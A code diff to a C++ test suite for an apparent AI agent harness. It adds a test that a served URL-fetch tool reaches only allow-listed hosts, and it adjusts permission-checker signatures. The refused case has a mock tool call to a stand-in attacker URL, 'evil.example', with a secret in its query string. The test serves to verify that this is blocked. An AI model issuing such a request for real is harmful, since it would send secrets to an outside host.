@@ -12,9 +12,11 @@
 #include <utility>
 #include <vector>
 
+#include "agent/fetch_url.h"
 #include "agent/tool.h"
 #include "backends/mock.h"
 #include "commands/embed.h"
+#include "commands/permissions.h"
 #include "embedstore/store.h"
 #include "harness/config.h"
 #include "harness/errors.h"
@@ -973,6 +975,65 @@ TEST_CASE("the mux answers 404 and 405 in the error shape", "[httpserver][mux]")
     CHECK(parsed(wrong_method)["error"]["type"] == "invalid_request_error");
 }
 
+TEST_CASE("a served fetch reaches only tools.allowed_hosts", "[httpserver][tools][permission]") {
+    // `serve` builds its checker from the config with nothing remembered and
+    // nobody to confirm (serve_cmd.cpp): an unlisted website is refused -- a
+    // change from before 2026-09-25, when a served fetch reached anything --
+    // and a listed one is fetched.
+    std::vector<std::string> fetched;
+    const auto fetch_tool = [&fetched] {
+        return apogee::agent::make_fetch_url_tool([&fetched](std::string_view url) {
+            fetched.emplace_back(url);
+            return apogee::agent::FetchResult{200, "<p>page text</p>", "", ""};
+        });
+    };
+    const auto call_for = [](std::string_view url) {
+        ToolCall call;
+        call.id = "call_f";
+        call.name = "fetch_url";
+        call.arguments = R"({"url":")" + std::string{url} + R"("})";
+        return call;
+    };
+    apogee::harness::Config config;
+    config.tools.allowed_hosts = {"docs.python.org"};
+    const auto result_text = [](const Fixture& fixture) {
+        std::string text;
+        for (const auto& request : fixture.provider->requests()) {
+            for (const ChatMessage& message : request.messages) {
+                if (message.role == Role::Tool) {
+                    text += message.content.plain_text();
+                }
+            }
+        }
+        return text;
+    };
+
+    SECTION("unlisted: refused, and the model is told") {
+        HandlerOptions options = served_default();
+        options.permission = apogee::commands::make_permission_checker(config, nullptr);
+        Fixture fixture{
+            {tool_turn({call_for("https://evil.example/?k=secret")}), text_turn("after")},
+            std::move(options),
+            true};
+        fixture.registry.add(fetch_tool());
+        REQUIRE(fixture.send(post("/v1/chat/completions", chat_body("read it"))).status == 200);
+        CHECK(fetched.empty());
+        CHECK(result_text(fixture).find("permission to reach evil.example was not given") !=
+              std::string::npos);
+    }
+    SECTION("listed: fetched") {
+        HandlerOptions options = served_default();
+        options.permission = apogee::commands::make_permission_checker(config, nullptr);
+        Fixture fixture{{tool_turn({call_for("https://docs.python.org/3/")}), text_turn("after")},
+                        std::move(options),
+                        true};
+        fixture.registry.add(fetch_tool());
+        REQUIRE(fixture.send(post("/v1/chat/completions", chat_body("read it"))).status == 200);
+        CHECK(fetched == std::vector<std::string>{"https://docs.python.org/3/"});
+        CHECK(result_text(fixture).find("page text") != std::string::npos);
+    }
+}
+
 TEST_CASE("a served destructive tool runs only when the config allows it; ask is deny",
           "[httpserver][tools][permission]") {
     // Nobody is attached to a served request, so there is no confirm function
@@ -1019,7 +1080,7 @@ TEST_CASE("a served destructive tool runs only when the config allows it; ask is
     SECTION("the config's allow, as the checker: it runs") {
         bool ran = false;
         HandlerOptions options = served_default();
-        options.permission = [](std::string_view, std::string_view) {
+        options.permission = [](const apogee::agent::GateRequest&) {
             return apogee::agent::Permission::Allow;
         };
         Fixture fixture{{tool_turn({call}), text_turn("after")}, std::move(options), true};
@@ -1031,7 +1092,7 @@ TEST_CASE("a served destructive tool runs only when the config allows it; ask is
     SECTION("the config's ask, as the checker: still denied -- nobody can answer") {
         bool ran = false;
         HandlerOptions options = served_default();
-        options.permission = [](std::string_view, std::string_view) {
+        options.permission = [](const apogee::agent::GateRequest&) {
             return apogee::agent::Permission::Ask;
         };
         Fixture fixture{{tool_turn({call}), text_turn("after")}, std::move(options), true};
